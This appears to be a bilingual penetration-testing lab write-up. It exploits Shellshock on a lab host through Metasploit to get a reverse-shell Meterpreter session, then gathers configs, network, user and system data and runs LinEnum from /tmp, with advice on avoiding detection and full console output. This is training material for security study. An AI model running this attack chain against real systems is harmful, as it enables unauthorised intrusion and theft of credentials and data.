---
layout: post
title: "Automating Linux Local Enumeration"
date: "2023-06-18"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Local Enumeration
## Automating Linux Local Enumeration
In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.

While local enumeration techniques/commands are important to know, as a penetration tester, you will need to be time efficient. As a result, you will need to learn how to utilize various automated enumeration scripts.

In addition to automating the process of enumerating information like system information, users & groups etc, these automated enumeration scripts will also provide you with additional information regarding the target system like; privilege escalation vulnerabilities, locally stored passwords, etc.

## Linux Local Enum Scripts
LinEnum - LinEnum is a simple bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities.

GitHub Repo: [rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

# Linux本地枚举
## 自动化Linux本地枚举
除了手动执行本地枚举之外，我们还可以借助一些脚本和MSF模块自动化该过程。

虽然了解本地枚举技术/命令很重要，但作为渗透测试人员，您需要高效利用时间。因此，您需要学习如何利用各种自动枚举脚本。

除了自动枚举系统信息、用户和组等信息的过程之外，这些自动化枚举脚本还会为您提供有关目标系统的其他信息，例如权限提升漏洞、本地存储的密码等等。

## Linux本地枚举脚本
LinEnum - LinEnum是一个简单的Bash脚本，它自动化了常见的Linux本地枚举检查，并识别权限提升漏洞。

GitHub存储库：[rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

## Demo: Automating Linux Local Enumeration（演示：自动化Linux本地枚举）
Kali Linux : 192.182.85.2

Target IP Address : 192.182.85.3

The next step will involve performing an Nmap scan on the target system in order to identify a vulnerable service that is running that we can then exploit to gain access to the target system.

`-sV`: We'll perform a quick service version detection scan.

```
nmap -sV 192.182.85.3
```

The shellshock vulnerability allows us to inject specific system commands into the HTTP headers that will then get executed.

Access the CGI script.

```
http://192.182.85.3/gettime.cgi
```

```
msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
use 5
show options
set RHOSTS 192.182.85.3
set TARGETURI /gettime.cgi
exploit
```

We obtain a Meterpreter session.

Let's start off by exploring a few post-exploitation modules for Linux that can be used to automate the enumeration of various types of information from a Linux target system.

I can put this in the background by typing in `background`, or I can use the key combination `Ctrl+Z`. And I'll just put this in the background.

```
sessions
```

[Linux Gather Configurations](https://www.rapid7.com/db/modules/post/linux/gather/enum_configs/)

Linux Gather Configurations

This module collects configuration files found on commonly installed applications and services, such as Apache, MySQL, Samba, Sendmail, etc. If a config file is found in its default path, the module will assume that is the file we want.

Linux收集配置文件  

这个模块会收集常见应用程序和服务的配置文件，比如Apache、MySQL、Samba、Sendmail等等。如果在默认路径下发现了配置文件，该模块会假定这就是我们需要的文件。

```
search enum_configs
use post/linux/gather/enum_configs  # use 0
show options
set SESSION 1
run
```

If I wanted to get an idea of what shells are available on the Linux target system.

[Linux Gather Network Information](https://www.rapid7.com/db/modules/post/linux/gather/enum_network/)

Linux Gather Network Information

This module gathers network information from the target system IPTables rules, interfaces, wireless information, open and listening ports, active network connections, DNS information and SSH information.

Linux收集网络信息

此模块从目标系统收集网络信息，包括IPTables规则、接口、无线信息、开放和监听端口、活动网络连接、DNS信息和SSH信息。

```
search enum_network
use post/linux/gather/enum_network # use 0
show options
set SESSION 1
run
```

This is going to gather all network information.

cat Network config. We're identifying the network configuration that was identified.

cat Listening ports.

cat Route table. That is the routing table. That gives you the default gateway.

[Linux Gather System and User Information](https://www.rapid7.com/db/modules/post/linux/gather/enum_system/)

Linux Gather System and User Information

This module gathers system information. We collect installed packages, installed services, mount information, user list, user bash history and cron jobs

Linux收集系统和用户信息

这个模块收集系统和用户信息。我们收集已安装的软件包、已安装的服务、挂载信息、用户列表、用户bash历史记录和cron作业。

```
search enum_system
use post/linux/gather/enum_system # use 0
set SESSION 1
run
```

cat Installed Packages. These are all the packages that are installed on the target system.

Linux Gather Virtual Environment Detection

This module attempts to determine whether the system is running inside of a virtual environment and if so, which one. This module supports detection of Hyper-V, VMWare, VirtualBox, Xen, and QEMU/KVM.

Linux Gather 虚拟环境检测

这个模块试图确定系统是否运行在虚拟环境中，如果是的话，是哪种虚拟环境。该模块支持检测 Hyper-V、VMWare、VirtualBox、Xen 和 QEMU/KVM。

```
search checkvm
use post/linux/gather/checkvm # use 0
set SESSION 1
run
```

[rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

```
LinEnum

更多信息请访问www.rebootuser.com

注意：导出功能目前处于实验阶段。

通用用法：

版本0.982

示例：./LinEnum.sh -s -k 关键词 -r 报告 -e /tmp/ -t

选项：

-k 输入关键词
-e 输入导出位置
-t 包括彻底（冗长）测试
-s 提供当前用户密码以检查sudo权限（不安全）
-r 输入报告名称
-h 显示此帮助文本

不带选项运行=有限的扫描/无输出文件

-e 要求用户输入输出位置，例如/tmp/export。如果此位置不存在，它将被创建。

-r 要求用户输入报告名称。报告（.txt文件）将保存在当前工作目录中。

-t 执行彻底（缓慢）测试。如果没有此开关，则执行默认的“快速”扫描。

-s 使用提供的密码作为当前用户以检查sudo权限-请注意，这是不安全的，只适用于CTF！

-k 用户可以使用可选开关在许多文件中搜索单个关键字（如下所述）。

有关更多详细信息，请参见CHANGELOG.md

LinEnum执行的检查/任务的高级摘要：

内核和发行版发布详细信息
系统信息：
主机名
网络详细信息：
当前IP
默认路由详细信息
DNS服务器信息
用户信息：
当前用户详细信息
最后登录的用户
显示登录到主机的用户
列出所有用户，包括uid / gid信息
列出root帐户
提取密码策略和哈希存储方法信息
检查umask值
检查密码哈希是否存储在/ etc / passwd中
提取“默认”uid（例如0、1000、1001等）的完整详细信息
尝试读取受限文件，即/ etc / shadow
列出当前用户的历史记录文件（即.bash_history，.nano_history等）
基本SSH检查
特权访问：
最近使用sudo的用户
确定是否可以访问/ etc / sudoers
确定当前用户是否具有无密码的Sudo访问权限
是否可以通过Sudo使用已知的“好”突破二进制文件（例如nmap，vim等）
根目录是否可访问
列出/ home /的权限
环境：
显示当前$ PATH
显示环境信息
作业/任务：
列出所有cron作业
定位所有可由全球编写的cron作业
定位其他系统用户拥有的cron作业
列出活动和非活动systemd计时器
服务：
列出网络连接（TCP和UDP）
列出运行中的进程
查找并列出进程二进制文件及其关联权限
列出inetd.conf / xined.conf内容及其二进制文件权限
列出init.d二进制文件权限
版本信息（以下）：
Sudo
MYSQL
Postgres
Apache
检查用户配置
显示已启用的模块
检查htpasswd文件是否存在
查看www目录
默认/弱凭据：
检查默认/弱Postgres帐户
检查默认/弱MYSQL帐户
搜索：
定位所有SUID / GUID文件
定位所有可全球编写的SUID / GUID文件
定位所有由root拥有的SUID / GUID文件
定位“有趣”的SUID / GUID文件（即nmap，vim等）
定位具有POSIX功能的文件
列出所有可全球编写的文件
查找/列出所有可访问的*.plan文件并显示内容
查找/列出所有可访问的*.rhosts文件并显示内容
显示NFS服务器详细信息
定位包含脚本运行时提供的关键字的*.conf和*.log文件
列出位于/ etc中的所有* .conf文件
.bak文件搜索
定位邮件
平台/软件特定测试：
检查我们是否在Docker容器中
检查主机是否安装了Docker
检查我们是否在LXC容器中
```

```
sessions
sessions 1
```

Just like Windows, whenever you're transferring scripts, exploit files, binaries, always make sure that you transfer them to the `/tmp`  directory. The reason we're doing this is primarily because you never want to upload or transfer your exploit files or scripts to directories or folders that are frequently accessed by users on the system, because if they discover a file, then that is an indicator of compromise. So always make sure to store your files and scripts in a location that is not frequently accessed by end users on the target system.

```
meterpreter > pwd
meterpreter > cd /tmp
meterpreter > ls
```

[rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
  
In addition to automating local enumeration on Linux, it also can be used to check for specific privilege escalation vulnerabilities.

`Ctrl+Shift+Alt`

```
meterpreter > upload /root/Desktop/LinEnum.sh
```

```
meterpreter > shell
/bin/bash -i
```

```
id
whoami
cat /etc/passwd
ls
chmod +x LinEnum.sh
./LinEnum.sh
```

# Automating Linux Local Enumeration
## Overview
Goal

This lab covers the process of automating local enumeration on Linux by leveraging various Metasploit post exploitation modules and local enumeration scripts.

# 自动化 Linux 本地枚举
## 概述
目标

本实验涵盖了通过利用各种 Metasploit 后期利用模块和本地枚举脚本在 Linux 上自动化本地枚举的过程。

## 复现视频内容
Kali Linux : 192.252.122.2

Target IP Address : 192.252.122.3

```
root@attackdefense:~# nmap -sV 192.252.122.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-06-17 21:18 IST
Nmap scan report for target-1 (192.252.122.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
MAC Address: 02:42:C0:FC:7A:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```

```
http://192.252.122.3/
```

```
<!DOCTYPE html>
<html>
<head>
<style>
body { 
    background-image: url('static/images/background.jpg');
    background-repeat: no-repeat;
    background-attachment: fixed;
    background-position: center; 
}
</style>
	<script>
	   setInterval(function() { 
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				document.getElementById("output").innerHTML = this.responseText;
			}
		};
		xhttp.open("GET", "/gettime.cgi", true);
		xhttp.send();
	    }, 1000);
	</script>

</head>
<body>
	<div style="position:fixed;top:67%;left:40%" id="output" ></div>
</body>
</html>
```

```
http://192.252.122.3/gettime.cgi
```

重启了实验室：

Kali Linux : 192.106.71.2

Target IP Address : 192.106.71.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)


msf5 > use 5
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /gettime.cgi
TARGETURI => /gettime.cgi
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.106.71.3
RHOSTS => 192.106.71.3
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 192.106.71.2:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (985320 bytes) to 192.106.71.3
[*] Meterpreter session 1 opened (192.106.71.2:4444 -> 192.106.71.3:60436) at 2023-06-18 07:34:27 +0530

meterpreter > 
```

```
meterpreter > 
Background session 1? [y/N]  
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                  Connection
  --  ----  ----                   -----------                                  ----------
  1         meterpreter x86/linux  uid=1, gid=1, euid=1, egid=1 @ 192.106.71.3  192.106.71.2:4444 -> 192.106.71.3:60436 (192.106.71.3)
```

```
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > search enum_configs

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   0  post/linux/gather/enum_configs                   normal  No     Linux Gather Configurations


msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > use 0
msf5 post(linux/gather/enum_configs) > show options

Module options (post/linux/gather/enum_configs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_configs) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_configs) > run

[*] Running module against 192.106.71.3 [victim-1]
[*] Info:
[*] 	Ubuntu 14.04.6 LTS  
[*] 	Linux victim-1 5.4.0-137-generic #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
[-] Failed to open file: /etc/apache2/apache2.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/apache2/ports.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/nginx/nginx.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/snort/snort.conf: core_channel_open: Operation failed: 1
[+] my.cnf stored in /root/.msf4/loot/20230618074016_default_192.106.71.3_linux.enum.conf_795668.txt
[-] Failed to open file: /etc/ufw/ufw.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/ufw/sysctl.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/security.access.conf: core_channel_open: Operation failed: 1
[+] shells stored in /root/.msf4/loot/20230618074016_default_192.106.71.3_linux.enum.conf_883085.txt
[+] sepermit.conf stored in /root/.msf4/loot/20230618074017_default_192.106.71.3_linux.enum.conf_124404.txt
[+] ca-certificates.conf stored in /root/.msf4/loot/20230618074017_default_192.106.71.3_linux.enum.conf_677760.txt
[+] access.conf stored in /root/.msf4/loot/20230618074017_default_192.106.71.3_linux.enum.conf_523742.txt
[-] Failed to open file: /etc/gated.conf: core_channel_open: Operation failed: 1
[+] rpc stored in /root/.msf4/loot/20230618074018_default_192.106.71.3_linux.enum.conf_020114.txt
[-] Failed to open file: /etc/psad/psad.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mysql/debian.cnf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/chkrootkit.conf: core_channel_open: Operation failed: 1
[+] logrotate.conf stored in /root/.msf4/loot/20230618074018_default_192.106.71.3_linux.enum.conf_733404.txt
[-] Failed to open file: /etc/rkhunter.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/samba/smb.conf: core_channel_open: Operation failed: 1
[+] ldap.conf stored in /root/.msf4/loot/20230618074019_default_192.106.71.3_linux.enum.conf_815832.txt
[-] Failed to open file: /etc/openldap/openldap.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cups/cups.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/opt/lampp/etc/httpd.conf: core_channel_open: Operation failed: 1
[+] sysctl.conf stored in /root/.msf4/loot/20230618074019_default_192.106.71.3_linux.enum.conf_512384.txt
[-] Failed to open file: /etc/proxychains.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cups/snmp.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mail/sendmail.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/snmp/snmp.conf: core_channel_open: Operation failed: 1
[*] Post module execution completed
```

```
msf5 post(linux/gather/enum_configs) > cat /root/.msf4/loot/20230618074016_default_192.106.71.3_linux.enum.conf_883085.txt
[*] exec: cat /root/.msf4/loot/20230618074016_default_192.106.71.3_linux.enum.conf_883085.txt

# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```

```
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > loot

Loot
====

host          service  type             name                  content     info  path
----          -------  ----             ----                  -------     ----  ----
192.106.71.3           linux.enum.conf  my.cnf                text/plain        /root/.msf4/loot/20230618074016_default_192.106.71.3_linux.enum.conf_795668.txt
192.106.71.3           linux.enum.conf  shells                text/plain        /root/.msf4/loot/20230618074016_default_192.106.71.3_linux.enum.conf_883085.txt
192.106.71.3           linux.enum.conf  sepermit.conf         text/plain        /root/.msf4/loot/20230618074017_default_192.106.71.3_linux.enum.conf_124404.txt
192.106.71.3           linux.enum.conf  ca-certificates.conf  text/plain        /root/.msf4/loot/20230618074017_default_192.106.71.3_linux.enum.conf_677760.txt
192.106.71.3           linux.enum.conf  access.conf           text/plain        /root/.msf4/loot/20230618074017_default_192.106.71.3_linux.enum.conf_523742.txt
192.106.71.3           linux.enum.conf  rpc                   text/plain        /root/.msf4/loot/20230618074018_default_192.106.71.3_linux.enum.conf_020114.txt
192.106.71.3           linux.enum.conf  logrotate.conf        text/plain        /root/.msf4/loot/20230618074018_default_192.106.71.3_linux.enum.conf_733404.txt
192.106.71.3           linux.enum.conf  ldap.conf             text/plain        /root/.msf4/loot/20230618074019_default_192.106.71.3_linux.enum.conf_815832.txt
192.106.71.3           linux.enum.conf  sysctl.conf           text/plain        /root/.msf4/loot/20230618074019_default_192.106.71.3_linux.enum.conf_512384.txt
```

```
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > loot -h
Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```

```
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > search enum_network

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   0  post/linux/gather/enum_network                   normal  No     Linux Gather Network Information


msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > use 0
msf5 post(linux/gather/enum_network) > show options

Module options (post/linux/gather/enum_network):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_network) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_network) > run

[*] Running module against 192.106.71.3
[*] Module running as daemon
[+] Info:
[+] 	Ubuntu 14.04.6 LTS  
[+] 	Linux victim-1 5.4.0-137-generic #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
[*] Collecting data...
[-] Failed to open file: /etc/ssh/sshd_config: core_channel_open: Operation failed: 1
[+] Network config stored in /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_173265.txt
[+] Route table stored in /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_265176.txt
[-] Unable to get data for Firewall config
[+] DNS config stored in /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_373331.txt
[-] Unable to get data for SSHD config
[+] Host file stored in /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_160146.txt
[-] Unable to get data for Active connections
[-] Unable to get data for Wireless information
[+] Listening ports stored in /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_408286.txt
[+] If-Up/If-Down stored in /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_406206.txt
[*] Post module execution completed
```

```
msf5 post(linux/gather/enum_network) > loot -S linux.enum.netwo

Loot
====

host          service  type                name  content     info             path
----          -------  ----                ----  -------     ----             ----
192.106.71.3           linux.enum.network        text/plain  Network config   /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_173265.txt
192.106.71.3           linux.enum.network        text/plain  Route table      /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_265176.txt
192.106.71.3           linux.enum.network        text/plain  DNS config       /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_373331.txt
192.106.71.3           linux.enum.network        text/plain  Host file        /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_160146.txt
192.106.71.3           linux.enum.network        text/plain  Listening ports  /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_408286.txt
192.106.71.3           linux.enum.network        text/plain  If-Up/If-Down    /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_406206.txt
```

```
msf5 post(linux/gather/enum_network) > cat /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_173265.txt
[*] exec: cat /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_173265.txt

eth0      Link encap:Ethernet  HWaddr 02:42:c0:6a:47:03  
          inet addr:192.106.71.3  Bcast:192.106.71.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:428 errors:0 dropped:0 overruns:0 frame:0
          TX packets:287 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2022072 (2.0 MB)  TX bytes:68747 (68.7 KB)

ip_vti0   Link encap:IPIP Tunnel  HWaddr   
          NOARP  MTU:1480  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
msf5 post(linux/gather/enum_network) > cat /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_408286.txt
[*] exec: cat /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_408286.txt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.11:36267        0.0.0.0:*               LISTEN      -               
udp        0      0 127.0.0.11:35663        0.0.0.0:*                           -               msf5 post(linux/gather/enum_network) > cat /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_265176.txt
[*] exec: cat /root/.msf4/loot/20230618080028_default_192.106.71.3_linux.enum.netwo_265176.txt

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         192.106.71.1    0.0.0.0         UG        0 0          0 eth0
192.106.71.0    *               255.255.255.0   U         0 0          0 eth0msf5
```

```
msf5 post(linux/gather/enum_network) > search enum_system

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   0  post/linux/gather/enum_system                   normal  No     Linux Gather System and User Information


msf5 post(linux/gather/enum_network) > use 0
msf5 post(linux/gather/enum_system) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_system) > run

[+] Info:
[+] 	Ubuntu 14.04.6 LTS  
[+] 	Linux victim-1 5.4.0-137-generic #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
[+] 	Module running as "daemon" user
[*] Linux version stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_708160.txt
[*] User accounts stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_918097.txt
[*] Installed Packages stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_257883.txt
[*] Running Services stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_832222.txt
[*] Cron jobs stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_062581.txt
[*] Disk info stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_508290.txt
[*] Logfiles stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_879861.txt
[*] Setuid/setgid files stored in /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_231073.txt
[*] Post module execution completed
msf5 post(linux/gather/enum_system) > loot -S linux.enum.syste

Loot
====

host          service  type               name  content     info                 path
----          -------  ----               ----  -------     ----                 ----
192.106.71.3           linux.enum.system        text/plain  Linux version        /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_708160.txt
192.106.71.3           linux.enum.system        text/plain  User accounts        /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_918097.txt
192.106.71.3           linux.enum.system        text/plain  Installed Packages   /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_257883.txt
192.106.71.3           linux.enum.system        text/plain  Running Services     /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_832222.txt
192.106.71.3           linux.enum.system        text/plain  Cron jobs            /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_062581.txt
192.106.71.3           linux.enum.system        text/plain  Disk info            /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_508290.txt
192.106.71.3           linux.enum.system        text/plain  Logfiles             /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_879861.txt
192.106.71.3           linux.enum.system        text/plain  Setuid/setgid files  /root/.msf4/loot/20230618080800_default_192.106.71.3_linux.enum.syste_231073.txt
```

```
msf5 post(linux/gather/enum_system) > search checkvm

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  post/linux/gather/checkvm                     normal  No     Linux Gather Virtual Environment Detection
   1  post/solaris/gather/checkvm                   normal  No     Solaris Gather Virtual Environment Detection
   2  post/windows/gather/checkvm                   normal  No     Windows Gather Virtual Environment Detection


msf5 post(linux/gather/enum_system) > use 0
msf5 post(linux/gather/checkvm) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/checkvm) > run

[*] Gathering System info ....
[+] This appears to be a 'Qemu/KVM' virtual machine
[*] Post module execution completed
```

[rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

```
msf5 post(linux/gather/checkvm) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                  Connection
  --  ----  ----                   -----------                                  ----------
  1         meterpreter x86/linux  uid=1, gid=1, euid=1, egid=1 @ 192.106.71.3  192.106.71.2:4444 -> 192.106.71.3:41442 (192.106.71.3)

msf5 post(linux/gather/checkvm) > sessions 1
[*] Starting interaction with 1...

meterpreter > pwd
/opt/apache/htdocs
meterpreter > cd /tmp
meterpreter > ls
Listing: /tmp
=============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  207   fil   2023-06-18 07:55:29 +0530  LVVjh
100777/rwxrwxrwx  207   fil   2023-06-18 07:34:26 +0530  PbcRH
100644/rw-r--r--  11    fil   2023-06-18 07:29:03 +0530  date
40755/rwxr-xr-x   4096  dir   2022-02-17 20:40:21 +0530  vuln_files

meterpreter > upload /root/Desktop/linenum.sh
[*] uploading  : /root/Desktop/linenum.sh -> linenum.sh
[*] Uploaded -1.00 B of 45.54 KiB (-0.0%): /root/Desktop/linenum.sh -> linenum.sh
[*] uploaded   : /root/Desktop/linenum.sh -> linenum.sh
meterpreter > shell
Process 184 created.
Channel 34 created.
/bin/bash -i
bash: cannot set terminal process group (10): Inappropriate ioctl for device
bash: no job control in this shell
daemon@victim-1:/tmp$ 
```

```
daemon@victim-1:/tmp$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@victim-1:/tmp$ whoami
whoami
daemon
daemon@victim-1:/tmp$ ls
ls
LVVjh
PbcRH
date
linenum.sh
vuln_files
daemon@victim-1:/tmp$ chmod +x linenum.sh
chmod +x linenum.sh
```

```
daemon@victim-1:/tmp$ ./linenum.sh
./linenum.sh

#########################################################
